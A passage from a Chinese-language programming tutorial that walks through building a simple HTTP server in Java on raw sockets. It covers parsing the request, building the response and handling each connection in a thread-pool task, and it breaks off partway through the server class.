id="HTTP-服务器设计"><a href="#HTTP-服务器设计" class="headerlink" title="HTTP 服务器设计"></a>HTTP 服务器设计</h3><p>接下来进入正题，基于 Socket 创建一个 HTTP 服务器，使用 Socket 基本没啥太大的问题，我们需要额外关注以下两点：</p><ul><li>对请求数据进行解析</li><li>封装返回结果</li></ul><h4 id="a-请求数据解析"><a href="#a-请求数据解析" class="headerlink" title="a. 请求数据解析"></a>a. 请求数据解析</h4><p>我们从 Socket 中拿到所有的数据，然后解析为对应的 HTTP 请求，我们先定义个 Request 对象，内部保存一些基本的 HTTP 信息，接下来重点就是将 Socket 中的所有数据都捞出来，封装为 request 对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Request</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 请求方法 GET/POST/PUT/DELETE/OPTION...</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String method;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 请求的uri</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String uri;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * HTTP版本</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String version;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 请求头</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, String&gt; headers;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 请求参数相关</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据前面的 HTTP 协议介绍，解析过程如下，我们先看请求行的解析过程。</p><p><strong>请求行</strong>，包含三个基本要素：请求方法 + URI + HTTP 版本，用空格进行分割，所以解析代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据标准的HTTP协议，解析请求行</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> reader</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">decodeRequestLine</span><span class="params">(BufferedReader reader, Request request)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    String[] strs = StringUtils.split(reader.readLine(), <span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="keyword">assert</span> strs.length == <span class="number">3</span>;</span><br><span class="line">    request.setMethod(strs[<span class="number">0</span>]);</span><br><span class="line">    request.setUri(strs[<span class="number">1</span>]);</span><br><span class="line">    request.setVersion(strs[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>请求头的解析</strong>，从第二行，到第一个空白行之间的所有数据，都是请求头；请求头的格式也比较清晰，形如 <code>key:value</code>, 具体实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 根据标准 HTTP 协议，解析请求头</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> reader  读取请求头的 BufferedReader 对象</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> request 存储请求信息的 Request 对象</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> IOException 当读取请求头信息时发生 I/O 异常时，将抛出该异常</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">decodeRequestHeader</span><span class="params">(BufferedReader reader, Request request)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 创建一个 Map 对象，用于存储请求头信息</span></span><br><span class="line">    Map&lt;String, String&gt; headers = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">16</span>);</span><br><span class="line">    <span class="comment">// 读取请求头信息，每行都是一个键值对，以空行结束</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> reader.readLine();</span><br><span class="line">    String[] kv;</span><br><span class="line">    <span class="keyword">while</span> (!<span class="string">&quot;&quot;</span>.equals(line)) &#123;</span><br><span class="line">        <span class="comment">// 将每行请求头信息按冒号分隔，分别作为键和值存入 Map 中</span></span><br><span class="line">        kv = StringUtils.split(line, <span class="string">&quot;:&quot;</span>);</span><br><span class="line">        <span class="keyword">assert</span> kv.length == <span class="number">2</span>;</span><br><span class="line">        headers.put(kv[<span class="number">0</span>].trim(), kv[<span class="number">1</span>].trim());</span><br><span class="line">        line = reader.readLine();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将解析出来的请求头信息存入 Request 对象中</span></span><br><span class="line">    request.setHeaders(headers);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>最后就是正文的解析了</strong>，这一块需要注意一点，正文可能为空，也可能有数据；有数据时，我们要如何把所有的数据都取出来呢？</p><p>先看具体实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据标注HTTP协议，解析正文</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> reader    输入流读取器，用于读取请求中的数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> request   Request 对象，表示 HTTP 请求</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException 当发生 I/O 错误时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">decodeRequestMessage</span><span class="params">(BufferedReader reader, Request request)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 从请求头中获取 Content-Length，如果没有，则默认为 0</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">contentLen</span> <span class="operator">=</span> Integer.parseInt(request.getHeaders().getOrDefault(<span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;0&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 Content-Length 为 0，表示没有请求正文，直接返回。</span></span><br><span class="line">    <span class="comment">// 例如 GET 和 OPTIONS 请求通常不包含请求正文</span></span><br><span class="line">    <span class="keyword">if</span> (contentLen == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据 Content-Length 创建一个字符数组来存储请求正文</span></span><br><span class="line">    <span class="type">char</span>[] message = <span class="keyword">new</span> <span class="title class_">char</span>[contentLen];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 BufferedReader 读取请求正文</span></span><br><span class="line">    reader.read(message);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将字符数组转换为字符串，并将其设置为 Request 对象的 message</span></span><br><span class="line">    request.setMessage(<span class="keyword">new</span> <span class="title class_">String</span>(message));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意上面我的使用姿势，首先是根据请求头中的<code>Content-Type</code>的值，来获得正文的数据大小，因此我们获取的方式是创建一个这么大的<code>char[]</code> 数组来读取流中所有数据，如果我们的数组比实际的小，则读不完；如果大，则数组中会有一些空的数据；</p><p><strong>最后将上面的几个解析封装一下</strong>，完成 request 解析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * HTTP 请求可以分为三部分：</span></span><br><span class="line"><span class="comment"> * 1. 请求行：包括请求方法、URI 和 HTTP 协议版本</span></span><br><span class="line"><span class="comment"> * 2. 请求头：从第二行开始，直到一个空行为止</span></span><br><span class="line"><span class="comment"> * 3. 消息正文：紧跟在空行后的所有内容，长度由请求头中的 Content-Length 决定</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 本方法将 InputStream 中的 HTTP 请求数据解析为一个 Request 对象</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> reqStream  包含 HTTP 请求数据的输入流</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>           一个表示 HTTP 请求的 Request 对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException 当发生 I/O 错误时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Request <span class="title function_">parse2request</span><span class="params">(InputStream reqStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 使用 BufferedReader 和 InputStreamReader 读取输入流中的数据</span></span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">httpReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(reqStream, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个新的 Request 对象</span></span><br><span class="line">    <span class="type">Request</span> <span class="variable">httpRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析请求行并设置到 Request 对象中</span></span><br><span class="line">    decodeRequestLine(httpReader, httpRequest);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析请求头并设置到 Request 对象中</span></span><br><span class="line">    decodeRequestHeader(httpReader, httpRequest);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析消息正文并设置到 Request 对象中</span></span><br><span class="line">    decodeRequestMessage(httpReader, httpRequest);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回解析后的 Request 对象</span></span><br><span class="line">    <span class="keyword">return</span> httpRequest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，是请求结果的封装，给一个简单的进行演示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Response 类表示一个 HTTP 响应，包括版本、状态码、状态信息、响应头和响应正文。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Response</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String version;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> String status;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, String&gt; headers;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 根据给定的 Request 对象和响应字符串构建一个 HTTP 响应。</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> request   用于构建响应的 Request 对象</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> response  响应字符串</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>          一个表示 HTTP 响应的字符串</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">buildResponse</span><span class="params">(Request request, String response)</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个新的 Response 对象，并设置版本、状态码和状态信息</span></span><br><span class="line">    <span class="type">Response</span> <span class="variable">httpResponse</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Response</span>();</span><br><span class="line">    httpResponse.setCode(<span class="number">200</span>);</span><br><span class="line">    httpResponse.setStatus(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    httpResponse.setVersion(request.getVersion());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置响应头</span></span><br><span class="line">    Map&lt;String, String&gt; headers = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    headers.put(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">    headers.put(<span class="string">&quot;Content-Length&quot;</span>, String.valueOf(response.getBytes().length));</span><br><span class="line">    httpResponse.setHeaders(headers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置响应正文</span></span><br><span class="line">    httpResponse.setMessage(response);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建响应字符串</span></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    buildResponseLine(httpResponse, builder);</span><br><span class="line">    buildResponseHeaders(httpResponse, builder);</span><br><span class="line">    buildResponseMessage(httpResponse, builder);</span><br><span class="line">    <span class="keyword">return</span> builder.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 构建响应行，包括版本、状态码和状态信息。</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> response      用于构建响应行的 Response 对象</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> stringBuilder 用于拼接响应字符串的 StringBuilder 对象</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">buildResponseLine</span><span class="params">(Response response, StringBuilder stringBuilder)</span> &#123;</span><br><span class="line">    stringBuilder.append(response.getVersion()).append(<span class="string">&quot; &quot;</span>).append(response.getCode()).append(<span class="string">&quot; &quot;</span>)</span><br><span class="line">            .append(response.getStatus()).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 构建响应头。</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> response      用于构建响应头的 Response 对象</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> stringBuilder 用于拼接响应字符串的 StringBuilder 对象</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">buildResponseHeaders</span><span class="params">(Response response, StringBuilder stringBuilder)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : response.getHeaders().entrySet()) &#123;</span><br><span class="line">        stringBuilder.append(entry.getKey()).append(<span class="string">&quot;:&quot;</span>).append(entry.getValue()).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    stringBuilder.append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 构建响应正文。</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> response      用于构建响应正文的 Response 对象</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> stringBuilder 用于拼接响应字符串的 StringBuilder 对象</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">buildResponseMessage</span><span class="params">(Response response, StringBuilder stringBuilder)</span> &#123;</span><br><span class="line">    stringBuilder.append(response.getMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="b-请求任务-HttpTask"><a href="#b-请求任务-HttpTask" class="headerlink" title="b. 请求任务 HttpTask"></a>b. 请求任务 HttpTask</h4><p>每个请求，单独分配一个任务来干这个事情，就是为了支持并发，对于 ServerSocket 而言，接收到了一个请求，那就创建一个 HttpTask 任务来实现 HTTP 通信。<br>那么这个 httptask 干啥呢？</p><ul><li>从请求中捞数据</li><li>响应请求</li><li>封装结果并返回</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * HttpTask 类实现了 Runnable 接口，用于处理一个 HTTP 请求。</span></span><br><span class="line"><span class="comment"> * 当在一个线程中执行时，该任务将处理一个 Socket 连接上的 HTTP 请求，</span></span><br><span class="line"><span class="comment"> * 并发送响应消息。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpTask</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="comment">// 用于处理 HTTP 请求的 Socket</span></span><br><span class="line">    <span class="keyword">private</span> Socket socket;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构造一个新的 HttpTask，用于处理指定的 Socket 连接。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> socket  用于处理 HTTP 请求的 Socket</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HttpTask</span><span class="params">(Socket socket)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.socket = socket;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 实现 Runnable 接口的 run 方法，用于处理 HTTP 请求并发送响应消息。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 检查 socket 是否为 null，如果为 null 则抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (socket == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;socket can&#x27;t be null.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取 Socket 的输出流，并创建一个 PrintWriter 对象</span></span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(outputStream);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 从 Socket 的输入流中解析 HTTP 请求</span></span><br><span class="line">            HttpMessageParser.<span class="type">Request</span> <span class="variable">httpRequest</span> <span class="operator">=</span> HttpMessageParser.parse2request(socket.getInputStream());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 根据请求结果进行响应，省略返回</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 根据请求和结果构建 HTTP 响应</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">httpRes</span> <span class="operator">=</span> HttpMessageParser.buildResponse(httpRequest, result);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 将 HTTP 响应发送到客户端</span></span><br><span class="line">                out.print(httpRes);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">// 如果发生异常，构建一个包含异常信息的 HTTP 响应</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">httpRes</span> <span class="operator">=</span> HttpMessageParser.buildResponse(httpRequest, e.toString());</span><br><span class="line">                out.print(httpRes);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 刷新输出流，确保响应消息被发送</span></span><br><span class="line">            out.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 关闭 Socket 连接</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                socket.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="c-HTTP-服务搭建"><a href="#c-HTTP-服务搭建" class="headerlink" title="c. HTTP 服务搭建"></a>c. HTTP 服务搭建</h4><p>前面的基本上把该干的事情都干了，剩下的就简单了，创建<code>ServerSocket</code>，绑定端口接收请求，我们在线程池中跑这个 HTTP 服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicHttpServer</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个单线程执行器，用于启动 HTTP 服务器</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">ExecutorService</span> <span class="variable">bootstrapExecutor</span> <span class="operator">=</span> Executors.newSingleThreadExecutor();</span><br><span class="line">    <span class="comment">// 创建一个线程池，用于处理来自客户端的 HTTP 请求</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ExecutorService taskExecutor;</span><br><span class="line">    <span class="comment">// 设置服务器监听的端口号</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">PORT</span> <span class="operator">=</span> <span class="number">8999</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动 HTTP 服务器的方法</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> 